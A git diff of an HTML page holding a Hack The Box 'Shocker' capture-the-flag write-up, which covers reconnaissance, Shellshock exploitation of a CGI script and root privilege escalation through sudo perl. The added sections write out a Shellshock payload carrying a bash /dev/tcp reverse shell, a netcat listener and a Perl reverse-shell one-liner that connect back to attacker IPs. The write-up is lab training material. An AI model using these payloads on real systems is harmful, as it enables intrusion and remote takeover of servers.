@@ -7,21 +7,40 @@
 </head>
 <body><div class="main"><div class="tree">
 <p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
-<p><a href="HacktheBox--Linux_Boxes--shocker.html">shocker</a></p>
+<p><a href="#Shocker">Shocker</a></p>
 
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--shocker--nmap.html">nmap</a></li>
-<li><a href="HacktheBox--Linux_Boxes--shocker--http.html">http</a></li>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#http">http</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster.html">gobuster</a></li>
+<li><a href="#gobuster">gobuster</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster--gobuster_10.10.10.56-cgi-bin.html">gobuster 10.10.10.56/cgi-bin</a></li>
-<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster--user.sh.html">user.sh</a></li>
+<li><a href="#gobuster">gobuster 10.10.10.56/cgi-bin</a></li>
+<li><a href="#user.sh">user.sh</a></li>
 </ol>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--shocker--shellshock_user.sh.html">shellshock user.sh</a></li>
-<li><a href="HacktheBox--Linux_Boxes--shocker--privesc.html">privesc</a></li>
-<li><a href="HacktheBox--Linux_Boxes--shocker--lessons_learned.html">lessons learned</a></li>
+<li><a href="#shellshock user.sh">shellshock user.sh</a></li>
+<li><a href="#privesc">privesc</a></li>
+<li><a href="#lessons learned">lessons learned</a></li>
 </ol></div>
-<div class="page"><h1><b><u>shocker</u></b></h1><img src="images/702-1.png" alt="images/702-1.png" /><br /><img src="images/702-2.png" alt="images/702-2.png" /><br /></div></div>
+<div class="page", id="Shocker"><h1><b><u>Shocker</u></b></h1><img src="images/702-1.png" alt="images/702-1.png" /><br /><img src="images/702-2.png" alt="images/702-2.png" /><br /></div>
+
+<div class="page", id="nmap"><h1><b><u>nmap</u></b></h1><img src="images/703-1.png" alt="images/703-1.png" /><br /><br /><span style="color:#ffa500;">nmap</span><span style="color:#24ff00;"> discovers </span><span style="color:#ffa500;">port 80</span><span style="color:#24ff00;"> running http with </span><span style="color:#ffa500;">Apache httpd 2.4.18</span><span style="color:#24ff00;"><br />and </span><span style="color:#ffa500;">port 2222</span><span style="color:#24ff00;"> running </span><span style="color:#ffa500;">OpenSSH 7.2p2</span></div>
+
+<div class="page", id="http"><h1><b><u>http</u></b></h1><img src="images/1968-1.png" alt="images/1968-1.png" /></div>
+
+<div class="page", id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#ffa500;">gobuster dir -w /usr/share/wordlists/dirb/small.txt -u 10.10.10.56</span><br /><br /><img src="images/704-1.png" alt="images/704-1.png" /></div>
+
+<div class="page", id="gobuster 10.10.10.56/cgi-bin"><h1><b><u>gobuster 10.10.10.56/cgi-bin</u></b></h1><span style="color:#ffa500;">gobuster dir -w /usr/share/wordlists/dirb/small.txt -u 10.10.10.56/cgi-bin</span><br /><br /><img src="images/705-1.png" alt="images/705-1.png" /></div>
+
+<div class="page", id="user.sh"><h1><b><u>user.sh</u></b></h1><span style="color:#24ff00;">navigating to </span><span style="color:#ffa500;">10.10.10.56/cgi-bin.user.sh</span><br /><br /><img src="images/706-1.png" alt="images/706-1.png" /><br /><br /><img src="images/706-2.png" alt="images/706-2.png" /></div>
+
+<div class="page", id="shellshock user.sh"><h1><b><u>shellshock user.sh</u></b></h1><span style="color:#24ff00;">implementing shellshock shellshock code looks like this:</span> <strong><span style="color:#ffa500;">() { :;}; </span></strong><br /><br /><span style="color:#24ff00;">lets test if </span><span style="color:#ffa500;">/cgi-bin/user.sh </span><span style="color:#24ff00;">is vulnerable to shellshock by testing a simple echo command</span><br /><img src="images/707-1.png" alt="images/707-1.png" /><br /><img src="images/707-2.png" alt="images/707-2.png" /><br /><span style="color:#24ff00;">we see our </span><span style="color:#ffa500;">echo</span><span style="color:#24ff00;"> statement executes in the server response proving the box is vulnerable to shellshock!</span><br /><br /><span style="color:#24ff00;">grab bash reverse shell from </span><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest-monkey </a><span style="color:#24ff00;">or copy it straight from here</span><br /><span style="color:#ffa500;">bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1</span><br /><img src="images/707-3.png" alt="images/707-3.png" /><br /><br /><br /><span style="color:#ffa500;">() { :;}; echo; bash -i &gt;&amp; /dev/tcp/10.10.14.62/1234 0&gt;&amp;1</span><br /><img src="images/707-4.png" alt="images/707-4.png" /><br /><br /><span style="color:#ffa500;">nc -nlvp 1234</span><br /><img src="images/707-5.png" alt="images/707-5.png" /></div>
+
+<div class="page", id="privesc"><h1><b><u>privesc</u></b></h1><span style="color:#ffa500;">sudo -l</span> <span style="color:#24ff00;">shows that shelly can run perl as root without a password so lets hop over the pentest monkey and grab its perl reverse shell</span><br /><img src="images/709-1.png" alt="images/709-1.png" /><br /><br /><span style="color:#24ff00;">there is a reverse shell perl script on pentest monkey as well</span><br /><span style="color:#ffa500;">perl -e 'use Socket;$i="10.10.14.23";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span><br /><img src="images/709-2.png" alt="images/709-2.png" /><br /><br /><br /><img src="images/709-3.png" alt="images/709-3.png" /><br /><span style="color:#24ff00;">Lets run perl as root and connect back to our attacking machine as root</span><br /><img src="images/709-4.png" alt="images/709-4.png" /><br /><br /><span style="color:#24ff00;">setting up a listener to catch the perl based reverse shell we pop </span><span style="color:#ffff00;">shocker's root </span><span style="color:#24ff00;">shell!</span><br /><img src="images/709-5.png" alt="images/709-5.png" /></div>
+
+<div class="page", id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br /><img src="images/1971-1.png" alt="images/1971-1.png" /></div>
+
+
+</div>
 </body></html>
